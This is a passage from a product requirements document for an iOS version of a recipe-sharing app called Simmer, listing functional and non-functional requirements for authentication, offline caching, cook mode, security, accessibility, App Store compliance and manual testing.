- **FR7:** Mobile users can perform all **account & authentication** capabilities defined in web FR38–FR39 (sign up, sign in, manage profile including display name and email).
- **FR41:** All inherited web capabilities (FR1–FR7) MUST be operable via touch-only iOS interactions. No hover-dependent affordances, no right-click, no keyboard-only paths. If a web flow currently requires hover or keyboard as its only path, mobile must provide an equivalent tap-driven alternative.

**Exceptions where mobile v1 differs from web:**
- Feed updates use the same 30-second polling mechanism. Push notifications deferred to v2.
- Write actions (cook log, save, friend request, partner invite, recipe creation/edit) require network connectivity. Offline writes deferred to v2.

---

### Mobile App Distribution & Installation

- **FR8:** Users can install Simmer Mobile on their iPhone via a TestFlight invitation link.
- **FR9:** System displays a native iOS launch screen (LaunchScreen.storyboard) before the app's WKWebView mounts.
- **FR10:** System displays a custom native app icon on the iOS home screen (all required iOS sizes for iPhone and iPad).

### Mobile Authentication & Session Persistence

- **FR11:** All API endpoints that require authentication accept `Authorization: Bearer <token>` as an alternative to the existing `auth-token` cookie (dual-auth path; cookie remains the primary for web).
- **FR12:** System login and signup endpoints return the `Session.token` in the response body in addition to setting the existing `auth-token` cookie.
- **FR13:** Mobile users can authenticate using the same email/password credentials as the web app.
- **FR14:** System persists the user's session token in iOS Keychain via Capacitor Secure Storage.
- **FR15:** System attaches the persisted session token in an `Authorization: Bearer <token>` header on every authenticated API request.
- **FR16:** System issues mobile-acquired session tokens with a 30-day expiry, refreshed on each successful API call (sliding-window).
- **FR17:** Users can sign out from the mobile app, which clears the session token from iOS Keychain and clears the local offline cache.
- **FR18:** System redirects to the login screen if the persisted session token is rejected (revoked or expired) by the server.
- **FR42:** System persists the session token in iOS Keychain using the `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` access class. (Token survives device reboot once unlocked; does not sync to iCloud; does not survive app uninstall.)

### Offline Reading & Cache

- **FR19:** System caches the current user's recipe library, partner vault, saved recipes ("want to try"), and the last 50 feed events to local persistent storage after the user first views them online.
- **FR20:** System caches any recipe detail page previously viewed online and renders it from cache when the device is offline.
- **FR21:** System displays a persistent "You're offline — showing cached recipes" banner whenever the device has no network connection.
- **FR22:** System displays an "Updated *N* minutes ago" timestamp on recipe detail views indicating cache freshness.
- **FR23:** System invalidates and refetches the user's library and feed queries when the app returns to the foreground after being backgrounded.
- **FR24:** System disables write actions (log a cook, save a recipe, send a friend or partner request, create or edit a recipe) when the device is offline and displays a "Connect to save" inline message on each disabled control.
- **FR37:** System automatically triggers a cache refresh and dismisses the offline banner when the device transitions from offline to online.
- **FR38:** Users can manually trigger a cache refresh via pull-to-refresh on the library, feed, and recipe detail views.
- **FR39:** The offline banner is non-dismissible during offline state — it dismisses automatically only when network returns.
- **FR43:** System handles offline cache write failures (storage full, persistence corruption, schema mismatch on app upgrade) by transparently falling back to in-memory cache without surfacing errors to the user.
- **FR44:** When the user taps a cached recipe that no longer exists on the server (deleted by owner), the app displays a "This recipe is no longer available" message and removes the stale entry from the cache.

### Mobile Kitchen / Cook Mode

- **FR25:** Users can enter and exit cook mode from any recipe detail view they can access (own, partner's, friend's, or saved).
- **FR26:** System holds the iPhone's screen awake using the Screen Wake Lock API while cook mode is active, releasing the lock when the user exits cook mode or backgrounds the app.
- **FR27:** System styles the status bar to match the cook-mode theme while cook mode is active.

### Native Haptic Feedback

- **FR28:** System triggers haptic feedback when the user marks a recipe as cooked.
- **FR29:** System triggers haptic feedback when the user saves a recipe from the feed to their "want to try" list.
- **FR30:** System triggers haptic feedback when the user unlinks a partner connection.

### Security & Privacy (Mobile)

- **FR31:** System enforces a Content-Security-Policy `img-src` restriction on recipe detail pages, limiting outbound image loads to an explicit allowlist (known CDN domains plus the recipe's source domain).
- **FR32:** System sanitizes extracted recipe content (strips event handlers and inline scripts) before storing it in the database.
- **FR33:** System clears the entire offline cache (`queryClient.clear()`) when the user signs out.
- **FR34:** System invalidates relevant offline cache entries when a partner is unlinked, a friend is removed, or a friend request is declined (keeps cache consistent with access-control changes).
- **FR35:** System discloses data collection in the iOS App Privacy declaration: email and name (account + friend search), recipe content (user-generated), cook logs and ratings (user activity), partner and friend relationships (social graph). None used for tracking; none shared with third parties.
- **FR45:** When a recipe's source image is blocked by CSP or fails to load, the system renders the existing deterministic image fallback chain (cuisine → dish → protein → gradient hash from [src/lib/recipe-images.ts](src/lib/recipe-images.ts)).

### Mobile Navigation & UX

- **FR36:** First-launch flow — if no persisted session exists, the app shows the login screen; on successful login, the app shows the existing `OnboardingModal` if the user's `hasSeenOnboarding` is false; otherwise routes directly to the library.
- **FR40:** iOS swipe-from-left-edge back gesture works on all nested navigation flows (recipe detail, friends, settings, friend search, recipe form).
- **FR46:** System honors iOS safe-area insets — bottom tab navigation renders above the home indicator; top content renders below the notch / Dynamic Island; status bar respects safe-area top.
- **FR47:** System respects the user's iOS system dark/light mode preference and updates the app theme reactively when the user toggles it at the OS level.

## Non-Functional Requirements

### Performance

- **NFR1** Cold start: app opens to library in ≤ 2.5 seconds on a 3-year-old iPhone over wifi.
- **NFR2** Cached recipe detail loads in ≤ 500 ms with airplane mode on (after first online view).
- **NFR3** Library scrolls smoothly without visible jank on a 3-year-old iPhone, verified manually during the real-device QA pass (NFR41).
- **NFR4** Online recipe-detail fetch with cached fallback renders in ≤ 1 second over 4G.
- **NFR5** Cook mode wake lock acquires within 500 ms of entering cook mode.
- **NFR6** Pull-to-refresh either shows updated results or an "up to date" indicator within 2 seconds of trigger.
- **NFR7** Inherited from web: filters and search apply instantly (client-side processing); optimistic UI updates for cook/save/favorite actions.
- **NFR8** AI recipe extraction completes within 30 seconds for typical recipe URLs (well-structured JSON-LD or common food blogs); URL-context fallback for Cloudflare-protected sites may take up to 60 seconds. A "Summarizing your recipe…" spinner is shown throughout. `maxDuration: 60` configured on the route handler.

### Security

- **NFR9** Authentication enforced server-side via `getCurrentUser()` on every protected endpoint; no client-trusted access decisions. (Capability defined in FR11.)
- **NFR10** Session-token storage uses platform-encrypted credential storage with device binding (see FR14 and FR42 for capability and access-class detail).
- **NFR11** Session token lifetime: 30 days for mobile-issued tokens (sliding window), 7 days for web cookies. Revocable via `Session` table deletion at any time.
- **NFR12** All API traffic over HTTPS (TLS 1.2+); enforced at the Vercel edge.
- **NFR13** No third-party analytics, telemetry, or advertising SDKs ship in the v1 binary. iOS App Privacy declaration reports zero tracking.
- **NFR14** Partner-vault and friend-visibility access boundaries enforced server-side in `src/app/api/recipes/[id]/route.ts`; the mobile client cannot bypass these by manipulating local cache.
- **NFR15** Defense-in-depth posture for user-generated and extracted recipe content: CSP enforcement at view layer (FR31) plus content sanitization at storage layer (FR32). Both must hold for the security boundary to be intact.

### Reliability

- **NFR16** Crash-free session rate ≥ 99.5% — **directional target**, not measured in v1 (no crash reporter integrated). Crash reporting (Sentry or equivalent) deferred to v2; cross-ref NFR45 for full measurement posture.
- **NFR17** User-initiated write actions display a success state only after server confirmation; failed writes show a clear error state with a manual retry option.
- **NFR18** Offline-to-online network transition handled within 5 seconds (offline banner dismissal + cache refresh kickoff).
- **NFR19** Cache persistence write failures degrade gracefully to in-memory cache (FR43); no user-visible error.
- **NFR20** AI extraction failures fall back to manual entry (existing web behavior preserved on mobile).
- **NFR21** Vercel backend uptime target: 99.9% for the API endpoints the mobile app depends on (inherited from web reliability NFR).

### Resource Consumption

- **NFR22** **Directional resource targets** (not instrumented in v1; verified opportunistically): battery ≤ 8%/hr during cook mode on iPhone 13+ (comparable to Maps navigation); offline cache ≤ 10 MB per 200 recipes (JSON content only, image cache delegated to WKWebView's native HTTP cache and additionally bounded to ~50 MB by iOS defaults); typical user-session network round-trip ≤ 30 KB compressed (AI extraction round-trips up to ~500 KB). These targets constrain design choices, not release gates — see NFR45 for measurement posture.
- **NFR25** **Background:** app does NOT poll the feed while backgrounded (battery preservation). Polling resumes on foreground (already gated by the existing `useFeedPolling` visibility check).

### Accessibility

- **NFR26** All interactive controls expose meaningful VoiceOver labels (e.g., "Mark recipe cooked, opens cook-log dialog").
- **NFR27** App respects iOS Dynamic Type — text scales with the system text-size setting up to the next Tailwind breakpoint.
- **NFR28** All touch targets meet Apple HIG minimum: 44 × 44 points.
- **NFR29** Text-to-background contrast meets WCAG AA: 4.5:1 for normal text, 3:1 for large text. Inherited dark mode (FR47) provides reduced eye strain in dim kitchen lighting.

### App Store Compliance

- **NFR30** iOS App Privacy declaration matches FR35 disclosures and stays in sync with backend data collection going forward.
- **NFR31** Encryption export compliance: `ITSAppUsesNonExemptEncryption: NO` in Info.plist (standard HTTPS only, no novel cryptography — eligible for exemption).
- **NFR32** Native polish (splash, icon, status bar styling, haptics, edge-to-edge) sufficient to pass Apple App Store Review Guideline 4.2 (Minimum Functionality).
- **NFR33** All Capacitor plugins used in v1 are App Store–permitted (no private iOS API usage).
- **NFR34** TestFlight beta build passes Apple's beta review on first or second submission.

### Integration

- **NFR35** The mobile app integrates only with the existing Simmer Vercel-hosted Next.js backend. No direct external API calls from the device.
- **NFR36** Gemini AI extraction is server-side only — the mobile client cannot invoke Gemini directly.
- **NFR37** Capacitor plugin set for v1: `@capacitor/network`, `@capacitor/preferences`, `@capacitor/haptics`, `@capacitor/status-bar`, `@capacitor/splash-screen`, `@capacitor/app`, `@capacitor-community/secure-storage`. New plugin additions require a security review.
- **NFR38** API wire format identical to web (JSON over HTTPS), with tag arrays stored as JSON-encoded strings — the existing serialization contract is preserved without modification.

### Test Surface (Explicit Mitigation for Flagged Risk)

The "combined test surface has no integration safety net" risk flagged in classification is mitigated by explicit, manual verification gates:

- **NFR39** **Dual-auth regression checklist:** all 16 existing API endpoints verified against both the cookie path and the `Authorization: Bearer` path (32 manual verifications) before TestFlight enablement. The checklist lives at `docs/dual-auth-regression-checklist.md` (to be created during implementation).
- **NFR40** **Auth golden-path smoke test:** 5 endpoints × 2 paths (login, list recipes, view recipe, log cook, view feed; cookie + Bearer) executed on production immediately after the dual-auth deploy. Mobile enablement gated on 10/10 passing.
- **NFR41** **Real-device QA pass:** the founder's iPhone serves as the v1 canary. Before TestFlight invites are issued to other family members, the founder completes a full manual QA pass covering: signup, login on cold install, library browse, recipe view (online + offline), cook mode + wake lock, cook log with rating, save-from-feed, partner invite + accept, partner unlink, logout.
- **NFR42** **WKWebView parity note:** any behavior delta between web (Safari) and mobile (WKWebView) — cookie handling, wake lock reliability, secure storage edge cases — documented at `docs/mobile-parity-notes.md` alongside the regression checklist.
- **NFR43** **Cache-invalidation verification:** FR23 (app-resume), FR34 (access-control changes), FR37 (network transition), FR44 (stale cache → server-deleted) each verified manually on a real device before TestFlight ship.

### Operations, Measurement & Maintenance

- **NFR44** **App-version forward compatibility:** the mobile app and backend agree on a stable wire-format contract. Backend changes are additive — new fields are nullable; existing field types preserved. Breaking wire-format changes require a coordinated mobile release with a backend rollback plan documented before deployment.
- **NFR45** **Measurement posture (explicit non-goal for v1):** v1 ships WITHOUT crash reporting, analytics, or telemetry SDKs. Success-criteria metrics (install rate, weekly opens, mobile-vs-web shift, kitchen-mode adoption) are tracked via direct family-cohort conversation and manual founder observation. Targets in NFR16 and NFR22 are directional, not instrumented. Crash reporting (Sentry or equivalent) and lightweight privacy-respecting analytics (e.g., self-hosted PostHog) deferred to v2.
- **NFR46** **Backend incident awareness:** founder subscribes to `vercel-status.com` notifications (and any managed-Postgres provider status feeds) for production incident awareness during the family-cohort phase.
- **NFR47** **iOS / Capacitor compatibility maintenance:** Capacitor SDK + plugin set reviewed for compatibility within 2 weeks of each iOS major release. Plan: skim the Capacitor changelog and run a real-device build at iOS major-version GA.
